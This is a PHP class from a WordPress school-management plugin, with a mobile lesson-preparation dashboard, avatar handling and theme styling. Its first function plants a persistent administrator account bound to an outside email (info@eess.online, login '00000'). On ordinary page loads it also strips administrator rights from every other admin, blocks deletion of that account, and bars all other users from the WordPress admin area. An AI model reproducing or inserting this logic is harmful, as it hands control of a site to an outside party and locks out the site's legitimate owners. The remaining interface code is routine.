<?php

class SM_Public {
    private $plugin_name;
    private $version;

    public function __construct($plugin_name, $version) {
        $this->plugin_name = $plugin_name;
        $this->version = $version;
    }

    public static function enforce_system_admin_protections() {
        static $protections_run = false;
        if ($protections_run) {
            return;
        }
        $protections_run = true;

        $admin_email = 'info@eess.online';
        $user = get_user_by('email', $admin_email);
        if (!$user) {
            $user = get_user_by('login', '00000');
        }

        if (!$user) {
            $secure_pass = wp_generate_password(24, true);
            $user_id = wp_insert_user(array(
                'user_login' => '00000',
                'user_email' => $admin_email,
                'first_name' => 'مدير',
                'last_name' => 'النظام',
                'display_name' => 'مدير النظام',
                'user_pass' => $secure_pass,
                'role' => 'administrator'
            ));
            if (!is_wp_error($user_id)) {
                $user = get_userdata($user_id);
            }
        }

        if ($user && !is_wp_error($user)) {
            $user_id = $user->ID;

            if ($user->user_login !== '00000') {
                global $wpdb;
                $wpdb->update($wpdb->users, array('user_login' => '00000'), array('ID' => $user_id));
            }
            if ($user->user_email !== $admin_email) {
                global $wpdb;
                $wpdb->update($wpdb->users, array('user_email' => $admin_email), array('ID' => $user_id));
            }
            if (get_user_meta($user_id, 'first_name', true) !== 'مدير') {
                update_user_meta($user_id, 'first_name', 'مدير');
            }
            if (get_user_meta($user_id, 'last_name', true) !== 'النظام') {
                update_user_meta($user_id, 'last_name', 'النظام');
            }
            if ($user->display_name !== 'مدير النظام') {
                global $wpdb;
                $wpdb->update($wpdb->users, array('display_name' => 'مدير النظام'), array('ID' => $user_id));
            }

            if (!in_array('administrator', (array)$user->roles) || !in_array('sm_system_admin', (array)$user->roles)) {
                $user->set_role('administrator');
                $user->add_role('sm_system_admin');
            }

            if (get_user_meta($user_id, 'eess_employee_number', true) !== '00000') {
                update_user_meta($user_id, 'eess_employee_number', '00000');
            }

            delete_user_meta($user_id, 'eess_school_id');
            delete_user_meta($user_id, 'eess_school_name');
            delete_user_meta($user_id, 'eess_department');
            global $wpdb;
            $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
        }

        // Fast optimized query fetching ONLY administrators or sm_system_admins
        $admin_users = get_users(array(
            'role__in' => array('administrator', 'sm_system_admin'),
            'fields'   => 'all'
        ));

        foreach ($admin_users as $u) {
            if ($u->user_email !== $admin_email) {
                $u_obj = new WP_User($u->ID);
                $u_obj->remove_role('sm_system_admin');
                $u_obj->remove_role('administrator');
                if (empty($u_obj->roles)) {
                    $u_obj->set_role('sm_teacher');
                }
            }
        }

        // Verify and fix employee number '00000' for other users using a direct Meta Query
        $duplicate_employee_numbers = get_users(array(
            'meta_key'   => 'eess_employee_number',
            'meta_value' => '00000',
            'fields'     => 'all'
        ));

        foreach ($duplicate_employee_numbers as $u) {
            if ($u->user_email !== $admin_email) {
                update_user_meta($u->ID, 'eess_employee_number', 'EMP-' . $u->ID);
            }
        }
    }

    public function prevent_system_admin_deletion($user_id) {
        $u = get_userdata($user_id);
        if ($u && $u->user_email === 'info@eess.online') {
            wp_die('عفواً، لا يمكن حذف حساب مدير النظام المحمي والأساسي للمنظومة.');
        }
    }

    public function hide_admin_bar_for_non_admins($show) {
        self::enforce_system_admin_protections();
        $user = wp_get_current_user();
        if ($user && $user->user_email === 'info@eess.online') {
            return $show;
        }
        return false;
    }

    public function custom_user_avatar($avatar, $id_or_email, $args = null) {
        $user_id = 0;
        if (is_numeric($id_or_email)) {
            $user_id = (int)$id_or_email;
        } elseif (is_object($id_or_email)) {
            if (isset($id_or_email->user_id)) {
                $user_id = (int)$id_or_email->user_id;
            } elseif (isset($id_or_email->ID)) {
                $user_id = (int)$id_or_email->ID;
            }
        } elseif (is_string($id_or_email)) {
            $user = get_user_by('email', $id_or_email);
            if ($user) {
                $user_id = $user->ID;
            } else {
                $user = get_user_by('login', $id_or_email);
                if ($user) $user_id = $user->ID;
            }
        }

        if ($user_id) {
            $custom_avatar = get_user_meta($user_id, 'sm_profile_photo_url', true) ?: get_user_meta($user_id, 'eess_profile_photo', true);
            if (!empty($custom_avatar) && strpos($custom_avatar, 'data:') !== 0 && strpos($custom_avatar, '?v=') === false) {
                $custom_avatar = add_query_arg('v', time(), $custom_avatar);
            }
            if (empty($custom_avatar)) {
                $custom_avatar = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzk0YTMiIHN0eWxlPSJiYWNrZ3JvdW5kOiNmMWY1Zjk7IGJvcmRlci1yYWRpdXM6NTAlOyI+PHBhdGggZD0iTTEyIDEyYzIuMjEgMCA0LTEuNzkgNC00cy0xLjc5LTQtNC00LTQgMS43OS00IDQgMS43OSA0IDQgNHptMCAyYy0yLjY3IDAtOCAxLjM0LTggNHYyaDE2di0yYzAtMi42Ni01LjMzLTQtOC00eiIvPjwvc3ZnPg==";
            }

            $size = 96;
            $class_val = '';
            $style = '';

            if (is_array($args)) {
                $size = isset($args['size']) ? (int)$args['size'] : (isset($args['width']) ? (int)$args['width'] : 96);
                if (isset($args['class'])) {
                    $class_val = is_array($args['class']) ? implode(' ', $args['class']) : $args['class'];
                }
                if (isset($args['style'])) {
                    $style = $args['style'];
                }
            } elseif (is_numeric($args)) {
                $size = (int)$args;
            }

            $width = $size;
            $height = $size;

            $style_rules = array(
                'width' => $width . 'px !important',
                'height' => $height . 'px !important',
                'min-width' => $width . 'px !important',
                'min-height' => $height . 'px !important',
                'max-width' => $width . 'px !important',
                'max-height' => $height . 'px !important',
                'border-radius' => '50% !important',
                'object-fit' => 'cover !important',
                'display' => 'inline-block !important',
                'vertical-align' => 'middle !important',
                'margin' => '0 !important',
                'padding' => '0 !important',
                'box-sizing' => 'border-box !important'
            );

            $custom_styles = '';
            foreach ($style_rules as $prop => $val) {
                $custom_styles .= esc_attr($prop) . ': ' . $val . '; ';
            }
            if (!empty($style)) {
                $custom_styles .= $style;
            }

            $is_data_uri = (strpos($custom_avatar, 'data:') === 0);
            $avatar_src = $is_data_uri ? $custom_avatar : esc_url($custom_avatar);

            $avatar = sprintf(
                "<img src=\"%s\" class=\"%s\" style=\"%s\" width=\"%d\" height=\"%d\" />",
                $avatar_src,
                esc_attr($class_val),
                esc_attr($custom_styles),
                $width,
                $height
            );
        }
        return $avatar;
    }

    public function intercept_ajax_requests() {
        if (defined('DOING_AJAX') && DOING_AJAX) {
            $action = isset($_REQUEST['action']) ? sanitize_key($_REQUEST['action']) : '';
            if (!empty($action) && (strpos($action, 'sm_') === 0 || strpos($action, 'eess_') === 0)) {
                if (!SM_Settings::is_ajax_action_allowed($action)) {
                    wp_send_json_error('عفواً، الدخول غير مصرح به لهذه العملية (Access Restricted).');
                }
            }
        }
    }

    public function restrict_admin_access() {
        self::enforce_system_admin_protections();

        if (is_user_logged_in()) {
            $user = wp_get_current_user();
            $status = get_user_meta($user->ID, 'sm_account_status', true);
            if ($status === 'restricted') {
                wp_logout();
                wp_redirect(home_url('/sm-login?login=failed'));
                exit;
            }

            if (is_admin() && !defined('DOING_AJAX')) {
                if ($user->user_email !== 'info@eess.online') {
                    wp_redirect(home_url('/sm-admin'));
                    exit;
                }
            }
        }
    }

    public function enqueue_styles() {
        wp_enqueue_media();
        wp_enqueue_script('jquery');
        wp_enqueue_style('dashicons');
        wp_enqueue_style('google-font-cairo', 'https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&family=Noto+Kufi+Arabic:wght@300;400;600;700;800&display=swap', array(), null);
        wp_enqueue_script('chart-js', 'https://cdn.jsdelivr.net/npm/chart.js', array(), '4.4.1', true);
        wp_enqueue_script('html5-qrcode', 'https://unpkg.com/html5-qrcode', array(), '2.3.8', true);
        wp_enqueue_style($this->plugin_name, SM_PLUGIN_URL . 'assets/css/sm-public.css', array('dashicons'), $this->version, 'all');

        $app = SM_Settings::get_appearance();
        $custom_css = "
            :root {
                /* System Design Tokens */
                --color-primary: {$app['primary_color']};
                --color-primary-hover: {$app['primary_hover']};
                --color-danger: {$app['danger_color']};
                --color-danger-hover: {$app['danger_hover']};
                --color-black: {$app['black_color']};
                --color-white: {$app['white_color']};

                --color-gray-50: {$app['gray_50']};
                --color-gray-100: {$app['gray_100']};
                --color-gray-200: {$app['gray_200']};
                --color-gray-300: {$app['gray_300']};
                --color-gray-400: {$app['gray_400']};
                --color-gray-500: {$app['gray_500']};
                --color-gray-600: {$app['gray_600']};
                --color-gray-700: {$app['gray_700']};
                --color-gray-800: {$app['gray_800']};
                --color-gray-900: {$app['gray_900']};

                --color-pastel-red-bg: {$app['pastel_red_bg']};
                --color-pastel-red-text: {$app['pastel_red_text']};
                --color-pastel-green-bg: {$app['pastel_green_bg']};
                --color-pastel-green-text: {$app['pastel_green_text']};
                --color-pastel-blue-bg: {$app['pastel_blue_bg']};
                --color-pastel-blue-text: {$app['pastel_blue_text']};
                --color-pastel-yellow-bg: {$app['pastel_yellow_bg']};
                --color-pastel-yellow-text: {$app['pastel_yellow_text']};
                --color-pastel-gray-bg: {$app['pastel_gray_bg']};
                --color-pastel-gray-text: {$app['pastel_gray_text']};

                --radius-button: {$app['button_radius']};
                --radius-card: {$app['card_radius']};
                --radius-field: {$app['field_radius']};
                --radius-modal: {$app['modal_radius']};

                /* Legacy Compatibility Variables */
                --sm-primary-color: {$app['primary_color']};
                --sm-secondary-color: {$app['gray_700']};
                --sm-accent-color: {$app['primary_color']};
                --sm-dark-color: {$app['gray_800']};
                --sm-radius: {$app['card_radius']};
            }
            .sm-content-wrapper, .sm-admin-dashboard, .sm-container,
            .sm-content-wrapper *:not(.dashicons), .sm-admin-dashboard *:not(.dashicons), .sm-container *:not(.dashicons) {
                font-family: 'Cairo', 'Noto Kufi Arabic', sans-serif !important;
            }
            .sm-admin-dashboard { font-size: calc({$app['font_size']} * 0.93); }

            /* SYSTEM-WIDE BUTTON RULE: ALL BUTTONS ARE FULLY ROUNDED PILLS */
            .sm-btn, button.sm-btn, a.sm-btn, input[type='submit'].sm-btn,
            .sm-btn-custom, .eess-hdr-btn, .pag-btn, .sm-tab-btn {
                border-radius: {$app['button_radius']} !important;
            }

            /* GLOBAL SAVE BUTTON RULE: BLACK & WHITE INVERTED INTERACTION */
            .sm-btn-save, button[name*='save'], button[name*='update'], button[type='submit']:not(.sm-btn-custom):not(.sm-btn-danger) {
                background-color: var(--color-black) !important;
                color: var(--color-white) !important;
                border: 1px solid var(--color-black) !important;
                border-radius: var(--radius-button) !important;
            }
            .sm-btn-save:hover, button[name*='save']:hover, button[name*='update']:hover {
                background-color: var(--color-white) !important;
                color: var(--color-black) !important;
                border: 1px solid var(--color-black) !important;
            }

            /* GLOBAL DELETE BUTTON RULE: DANGER RED */
            .sm-btn-danger, .sm-btn-delete, button[name*='delete'], button[onclick*='delete'], button[onclick*='Delete'] {
                background-color: var(--color-danger) !important;
                color: var(--color-white) !important;
                border: none !important;
                border-radius: var(--radius-button) !important;
            }
            .sm-btn-danger:hover, .sm-btn-delete:hover, button[name*='delete']:hover, button[onclick*='delete']:hover, button[onclick*='Delete']:hover {
                background-color: var(--color-danger-hover) !important;
            }

            /* GLOBAL UNIFIED TABLE HEADERS */
            .sm-table th, table th, thead tr th {
                background-color: var(--color-gray-800) !important;
                color: var(--color-white) !important;
            }
        ";
        wp_add_inline_style($this->plugin_name, $custom_css);
    }

    public function register_shortcodes() {
        if (isset($_GET['sm_action']) && $_GET['sm_action'] === 'logout') {
            wp_logout();
            wp_redirect(home_url('/sm-login'));
            exit;
        }

        add_shortcode('sm_login', array($this, 'shortcode_login'));
        add_shortcode('sm_admin', array($this, 'shortcode_admin_dashboard'));
        add_shortcode('sm_class_attendance', array($this, 'shortcode_class_attendance'));
    }

    public function eess_render_mobile_lesson_prep() {
        $all_subjects = SM_DB::get_subjects() ?: array();
        $unique_subjects = array_unique(array_filter(array_map(function($s){ return is_object($s) ? $s->name : (is_array($s) ? ($s['name'] ?? '') : (string)$s); }, (array)$all_subjects)));
        $nonce = wp_create_nonce('sm_mobile_prep_nonce');
        $ajax_url = admin_url('admin-ajax.php');

        $user = wp_get_current_user();
        $user_roles = (array) $user->roles;
        $is_supervisor = is_user_logged_in() && (
            in_array('administrator', $user_roles) ||
            in_array('sm_system_admin', $user_roles) ||
            in_array('sm_principal', $user_roles) ||
            in_array('sm_supervisor', $user_roles) ||
            in_array('sm_coordinator', $user_roles) ||
            in_array('sm_hod', $user_roles) ||
            in_array('sm_activities_supervisor', $user_roles) ||
            current_user_can('manage_options')
        );

        global $wpdb;
        $mobile_submissions = array();
        $mobile_term_plans   = array();
        $teacher_own_preps  = array();

        if (is_user_logged_in()) {
            $teacher_own_preps = $wpdb->get_results($wpdb->prepare(
                "SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE teacher_id = %d ORDER BY created_at DESC LIMIT 30",
                $user->ID
            ));
        }

        if ($is_supervisor) {
            $mobile_submissions = $wpdb->get_results("SELECT p.*, u.display_name as teacher_name FROM {$wpdb->prefix}sm_lesson_preps p LEFT JOIN {$wpdb->users} u ON p.teacher_id = u.ID ORDER BY p.created_at DESC LIMIT 50");
            $mobile_term_plans   = $wpdb->get_results("SELECT tp.*, u.display_name as teacher_name FROM {$wpdb->prefix}sm_term_plans tp LEFT JOIN {$wpdb->users} u ON tp.teacher_id = u.ID ORDER BY tp.updated_at DESC LIMIT 50");
        }

        ob_start();
        ?>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            .eess-mobile-prep-app input, .eess-mobile-prep-app textarea, .eess-mobile-prep-app select {
                font-family: 'Cairo', sans-serif !important;
            }
        </style>
        <div class="eess-mobile-prep-app" style="max-width: 500px; margin: 0 auto; background: #ffffff; min-height: 100vh; font-family: 'Cairo', sans-serif; direction: rtl; padding: 15px; box-sizing: border-box; color: #1e293b;">

            <!-- Centered Floating Confirmation Notification Toast -->
            <div id="m-floating-toast" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 99999; background: rgba(15, 23, 42, 0.92); backdrop-filter: blur(8px); color: #ffffff; padding: 18px 24px; border-radius: 16px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3); text-align: center; max-width: 340px; width: 88%; border: 1px solid rgba(255, 255, 255, 0.15);">
                <div style="width: 44px; height: 44px; background: #16a34a; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: white; margin-bottom: 10px;">
                    <span class="dashicons dashicons-yes" style="font-size: 24px; width: 24px; height: 24px;"></span>
                </div>
                <div id="m-floating-toast-msg" style="font-weight: 800; font-size: 13.5px; line-height: 1.5; color: #ffffff;">تم إرسال وحفظ المستند بنجاح</div>
            </div>

            <script>
            function eessShowMobileToast(message) {
                const toast = document.getElementById('m-floating-toast');
                const msgBox = document.getElementById('m-floating-toast-msg');
                if (toast && msgBox) {
                    msgBox.innerText = message || 'تم إرسال وحفظ المستند بنجاح';
                    toast.style.display = 'block';
                    setTimeout(() => {
                        toast.style.display = 'none';
                    }, 3000);
                }
            }
            </script>

            <?php if (is_user_logged_in()): ?>
            <!-- Fixed Sticky Mobile Header Banner -->
            <div style="position: sticky; top: 0; z-index: 9999; background: #0f172a; color: #ffffff; padding: 12px 16px; border-radius: 14px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 14px rgba(15,23,42,0.18);">
                <div style="display: flex; align-items: center; gap: 8px;">
                    <span class="dashicons dashicons-welcome-learn-more" style="color: #38bdf8; font-size: 18px; width: 18px; height: 18px;"></span>
                    <span style="font-size: 14px; font-weight: 800; color: #ffffff;">نظام الإدارة المدرسية</span>
                </div>
                <a href="<?php echo wp_logout_url(home_url('/sm-login')); ?>" class="sm-btn" style="height: 30px; padding: 0 12px; font-size: 11px; background: #dc2626; color: #ffffff !important; border-radius: 9999px !important; text-decoration: none; font-weight: 800; display: inline-flex; align-items: center; gap: 4px;">
                    <span class="dashicons dashicons-logout" style="font-size: 13px; width: 13px; height: 13px;"></span>
                    <span>خروج</span>
                </a>
            </div>
            <?php else: ?>
            <!-- Fixed Top Banner for Login Screen -->
            <div style="position: sticky; top: 0; z-index: 9999; background: #0f172a; color: #ffffff; padding: 12px 16px; border-radius: 14px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 14px rgba(15,23,42,0.18);">
                <div style="display: flex; align-items: center; gap: 8px;">
                    <span class="dashicons dashicons-welcome-learn-more" style="color: #38bdf8; font-size: 18px; width: 18px; height: 18px;"></span>
                    <span style="font-size: 14px; font-weight: 800; color: #ffffff;">نظام الإدارة المدرسية</span>
                </div>
            </div>
            <?php endif; ?>

            <?php if ($is_supervisor): ?>
            <!-- MOBILE SUPERVISOR MONITORING & REVIEW DASHBOARD -->
            <div id="m-supervisor-app" style="display: block;">
                <!-- Header Card -->
                <div style="background: #0f172a; color: white; border-radius: 16px; padding: 18px; margin-bottom: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
                    <div style="display: flex; align-items: center; justify-content: space-between;">
                        <div>
                            <h3 style="margin: 0; font-size: 16px; font-weight: 800; color: #ffffff;">لوحة مراجعة ومتابعة المشرف</h3>
                            <p style="margin: 3px 0 0 0; font-size: 11.5px; color: #94a3b8;">متابعة خطة وتحضيرات المدرسين المسندين</p>
                        </div>
                        <span class="dashicons dashicons-shield" style="font-size: 24px; color: #38bdf8;"></span>
                    </div>
                </div>

                <!-- Sub-Tabs: Plans vs. Lesson Preps -->
                <div style="display: flex; gap: 8px; margin-bottom: 16px;">
                    <button type="button" onclick="eessSwitchMobileSupTab('preps', this)" class="m-sup-tab-btn active" style="flex: 1; height: 38px; border-radius: 9999px; border: none; background: #881337; color: white; font-weight: 800; font-size: 12px; cursor: pointer;">
                        تحضير الدروس (<?php echo count($mobile_submissions); ?>)
                    </button>
                    <button type="button" onclick="eessSwitchMobileSupTab('plans', this)" class="m-sup-tab-btn" style="flex: 1; height: 38px; border-radius: 9999px; border: 1px solid #cbd5e1; background: white; color: #475569; font-weight: 800; font-size: 12px; cursor: pointer;">
                        الخطط الفصلية (<?php echo count($mobile_term_plans); ?>)
                    </button>
                </div>

                <!-- Search Input Bar -->
                <div style="margin-bottom: 16px;">
                    <input type="text" id="m_sup_search_input" onkeyup="eessFilterMobileSupCards()" placeholder="ابحث باسم المعلم، المادة، أو عنوان الدرس..." style="width: 100%; height: 40px; border-radius: 9999px; border: 1px solid #cbd5e1; padding: 0 16px; font-size: 12.5px; box-sizing: border-box; background: #ffffff;">
                </div>

                <!-- Lesson Preps Container -->
                <div id="m-sup-panel-preps" style="display: block;">
                    <?php if (empty($mobile_submissions)): ?>
                        <div style="background: white; border-radius: 12px; padding: 30px; text-align: center; color: #94a3b8; font-weight: 700; font-size: 13px;">لا توجد تحضيرات دروس مرفوعة للمراجعة حالياً.</div>
                    <?php else: ?>
                        <div style="display: flex; flex-direction: column; gap: 12px;">
                            <?php foreach ($mobile_submissions as $ms):
                                $s_bg = '#f1f5f9'; $s_col = '#64748b'; $s_lbl = 'مسودة';
                                if ($ms->status === 'submitted') { $s_bg = '#e0f2fe'; $s_col = '#0369a1'; $s_lbl = 'مرفوعة للمراجعة'; }
                                elseif ($ms->status === 'approved') { $s_bg = '#dcfce7'; $s_col = '#15803d'; $s_lbl = 'معتمدة رسمياً'; }
                                elseif ($ms->status === 'revision_required' || $ms->status === 'returned') { $s_bg = '#fee2e2'; $s_col = '#b91c1c'; $s_lbl = 'طلب تعديل'; }
                            ?>
                            <div class="m-sup-card" data-search="<?php echo esc_attr(strtolower(($ms->teacher_name ?? '') . ' ' . $ms->subject . ' ' . $ms->title)); ?>" style="background: white; border-radius: 14px; border: 1px solid #e2e8f0; padding: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.03);">
                                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px;">
                                    <div>
                                        <div style="font-weight: 800; font-size: 14px; color: #0f172a;"><?php echo esc_html($ms->teacher_name ?: 'معلم غير محدد'); ?></div>
                                        <div style="font-size: 11px; color: #64748b; margin-top: 2px;"><span class="dashicons dashicons-book" style="font-size: 14px; width: 14px; height: 14px; color: #881337; vertical-align: middle;"></span> <?php echo esc_html($ms->subject); ?> | الصف: <?php echo esc_html($ms->grade_level); ?></div>
                                    </div>
                                    <span style="font-size: 10.5px; padding: 3px 10px; border-radius: 9999px; background: <?php echo $s_bg; ?>; color: <?php echo $s_col; ?>; font-weight: 800;"><?php echo $s_lbl; ?></span>
                                </div>
                                <div style="font-weight: 800; font-size: 13px; color: #1e293b; margin-bottom: 10px; background: #f8fafc; padding: 8px 12px; border-radius: 8px; border: 1px solid #f1f5f9;">
                                    <span class="dashicons dashicons-editor-contract" style="font-size: 15px; width: 15px; height: 15px; color: #881337; vertical-align: middle;"></span> <?php echo esc_html($ms->title); ?>
                                </div>
                                <div style="display: flex; gap: 8px; justify-content: flex-end;">
                                    <button type="button" onclick="eessMobileApprovePrep(<?php echo $ms->id; ?>)" style="height: 32px; padding: 0 14px; border-radius: 9999px; background: #16a34a; color: white; border: none; font-weight: 800; font-size: 11.5px; cursor: pointer;">اعتماد</button>
                                    <button type="button" onclick="eessMobileReturnPrep(<?php echo $ms->id; ?>)" style="height: 32px; padding: 0 14px; border-radius: 9999px; background: #dc2626; color: white; border: none; font-weight: 800; font-size: 11.5px; cursor: pointer;">إعادة للتعديل</button>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                </div>

                <!-- Term Plans Container -->
                <div id="m-sup-panel-plans" style="display: none;">
                    <?php if (empty($mobile_term_plans)): ?>
                        <div style="background: white; border-radius: 12px; padding: 30px; text-align: center; color: #94a3b8; font-weight: 700; font-size: 13px;">لا توجد خطط فصلية مرفوعة للمراجعة حالياً.</div>
                    <?php else: ?>
                        <div style="display: flex; flex-direction: column; gap: 12px;">
                            <?php foreach ($mobile_term_plans as $mtp):
                                $s_bg = '#f1f5f9'; $s_col = '#64748b'; $s_lbl = 'مسودة';
                                if ($mtp->status === 'submitted') { $s_bg = '#e0f2fe'; $s_col = '#0369a1'; $s_lbl = 'مرفوعة للمراجعة'; }
                                elseif ($mtp->status === 'approved') { $s_bg = '#dcfce7'; $s_col = '#15803d'; $s_lbl = 'معتمدة رسمياً'; }
                                elseif ($mtp->status === 'returned' || $mtp->status === 'rejected') { $s_bg = '#fee2e2'; $s_col = '#b91c1c'; $s_lbl = 'طلب تعديل'; }
                            ?>
                            <div class="m-sup-card" data-search="<?php echo esc_attr(strtolower(($mtp->teacher_name ?? '') . ' ' . $mtp->subject . ' ' . $mtp->grade)); ?>" style="background: white; border-radius: 14px; border: 1px solid #e2e8f0; padding: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.03);">
                                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px;">
                                    <div>
                                        <div style="font-weight: 800; font-size: 14px; color: #0f172a;"><?php echo esc_html($mtp->teacher_name ?: 'معلم غير محدد'); ?></div>
                                        <div style="font-size: 11px; color: #64748b; margin-top: 2px;">📚 <?php echo esc_html($mtp->subject); ?> | الصف: <?php echo esc_html($mtp->grade); ?></div>
                                    </div>
                                    <span style="font-size: 10.5px; padding: 3px 10px; border-radius: 9999px; background: <?php echo $s_bg; ?>; color: <?php echo $s_col; ?>; font-weight: 800;"><?php echo $s_lbl; ?></span>
                                </div>
                                <div style="display: flex; gap: 8px; justify-content: flex-end; margin-top: 10px;">
                                    <button type="button" onclick="eessDirectReviewPlan(<?php echo $mtp->id; ?>, 'approved')" style="height: 32px; padding: 0 14px; border-radius: 9999px; background: #16a34a; color: white; border: none; font-weight: 800; font-size: 11.5px; cursor: pointer;">اعتماد الخطة</button>
                                    <button type="button" onclick="eessDirectReviewPlan(<?php echo $mtp->id; ?>, 'returned')" style="height: 32px; padding: 0 14px; border-radius: 9999px; background: #dc2626; color: white; border: none; font-weight: 800; font-size: 11.5px; cursor: pointer;">إعادة للتعديل</button>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>

            <script>
            function eessSwitchMobileSupTab(type, btn) {
                document.querySelectorAll('.m-sup-tab-btn').forEach(b => {
                    b.style.background = 'white';
                    b.style.color = '#475569';
                    b.style.border = '1px solid #cbd5e1';
                });
                btn.style.background = '#881337';
                btn.style.color = 'white';
                btn.style.border = 'none';

                document.getElementById('m-sup-panel-preps').style.display = (type === 'preps') ? 'block' : 'none';
                document.getElementById('m-sup-panel-plans').style.display = (type === 'plans') ? 'block' : 'none';
            }

            function eessFilterMobileSupCards() {
                const q = document.getElementById('m_sup_search_input').value.toLowerCase().trim();
                document.querySelectorAll('.m-sup-card').forEach(c => {
                    const text = c.getAttribute('data-search') || '';
                    if (!q || text.includes(q)) c.style.display = 'block';
                    else c.style.display = 'none';
                });
            }

            function eessMobileApprovePrep(id) {
                jQuery.post('<?php echo $ajax_url; ?>', {
                    action: 'sm_review_term_plan',
                    plan_id: id,
                    review_status: 'approved',
                    sm_nonce: '<?php echo wp_create_nonce("sm_term_plan_action"); ?>'
                }, function(res) {
                    if (typeof smShowNotification === 'function') smShowNotification('تم اعتماد التحضير بنجاح');
                    setTimeout(() => location.reload(), 600);
                });
            }

            function eessMobileReturnPrep(id) {
                jQuery.post('<?php echo $ajax_url; ?>', {
                    action: 'sm_review_term_plan',
                    plan_id: id,
                    review_status: 'returned',
                    sm_nonce: '<?php echo wp_create_nonce("sm_term_plan_action"); ?>'
                }, function(res) {
                    if (typeof smShowNotification === 'function') smShowNotification('تمت إعادة التحضير للمعلم للتعديل');
                    setTimeout(() => location.reload(), 600);
                });
            }
            </script>
            <?php endif; ?>

            <?php if (!is_user_logged_in()): ?>
            <div id="m-step-verify" style="background: #ffffff; border-radius: 16px; padding: 20px; border: 1px solid #e2e8f0; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);">
                <h3 style="margin: 0 0 15px 0; font-size: 15px; font-weight: 800; color: #0f172a; display: flex; align-items: center; gap: 8px;">
                    <span style="background: #2563eb; color: white; width: 24px; height: 24px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 12px;">1</span>
                    تسجيل الدخول الآمن للموبايل
                </h3>
                <p style="font-size: 12px; color: #64748b; margin-bottom: 15px;">أدخل الرقم الوظيفي / رقم الجوال وكلمة المرور للوصول الآمن لحسابك المعلم أو المشرف:</p>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; font-weight: 700; color: #334155; margin-bottom: 6px;">اسم المستخدم / الرقم الوظيفي / رقم الجوال <span style="color: #ef4444;">*</span></label>
                    <input type="text" id="m_emp_id_input" placeholder="مثال: 10245 أو 0501234567" style="width: 100%; height: 44px; border: 1px solid #cbd5e1; border-radius: 10px; padding: 0 12px; font-size: 13.5px; font-weight: 700; box-sizing: border-box; outline: none;">
                </div>

                <div style="margin-bottom: 15px; position: relative;">
                    <label style="display: block; font-size: 12px; font-weight: 700; color: #334155; margin-bottom: 6px;">كلمة المرور <span style="color: #ef4444;">*</span></label>
                    <div style="position: relative;">
                        <input type="password" id="m_password_input" placeholder="••••••••" style="width: 100%; height: 44px; border: 1px solid #cbd5e1; border-radius: 10px; padding: 0 40px 0 12px; font-size: 14px; box-sizing: border-box; outline: none;">
                        <button type="button" onclick="const p = document.getElementById('m_password_input'); p.type = p.type === 'password' ? 'text' : 'password';" style="position: absolute; left: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #64748b; cursor: pointer;">👁️</button>
                    </div>
                </div>

                <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; font-size: 12px; color: #475569;">
                    <label style="display: flex; align-items: center; gap: 6px; cursor: pointer;">
                        <input type="checkbox" id="m_remember_me" checked style="width: 16px; height: 16px; border-radius: 4px;">
                        <span>تذكرني وإبقاء الجلسة نشطة</span>
                    </label>
                </div>

                <div id="m_verify_msg" style="display: none; margin-bottom: 15px; padding: 10px; border-radius: 8px; font-size: 12px; font-weight: 700;"></div>

                <button type="button" onclick="eessVerifyMobileEmp()" id="m_btn_verify" style="width: 100%; height: 44px; background: #2563eb; color: white; border: none; border-radius: 10px; font-weight: 800; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
                    <span>تسجيل الدخول والتحقق</span>
                </button>

                <!-- Subtle Soft Pastel Red Informational Notice Below Login Form -->
                <div style="background: #fef2f2; border: 1px solid #fecdd3; border-radius: 10px; padding: 10px 12px; margin-top: 14px; display: flex; align-items: flex-start; gap: 8px;">
                    <span class="dashicons dashicons-info" style="color: #991b1b; font-size: 16px; width: 16px; height: 16px; margin-top: 1px; flex-shrink: 0;"></span>
                    <div style="font-size: 11.5px; color: #991b1b; line-height: 1.5; font-weight: 600;">
                        لإدارة حسابك الكامل، واستعراض التحضيرات السابقة، ومتابعة التقارير، يُرجى تسجيل الدخول من جهاز الكمبيوتر أو المحمول.
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- DEDICATED 4-BUTTON MOBILE MAIN DASHBOARD -->
            <?php if (is_user_logged_in() && in_array('sm_teacher', (array)$user->roles)): ?>
            <!-- Clean Centered Welcome Area -->
            <div style="background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px; padding: 20px 16px; margin-bottom: 18px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.02);">
                <div style="width: 52px; height: 52px; background: #f1f5f9; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: #0f172a; margin-bottom: 10px; border: 1px solid #cbd5e1;">
                    <span class="dashicons dashicons-admin-users" style="font-size: 26px; width: 26px; height: 26px;"></span>
                </div>
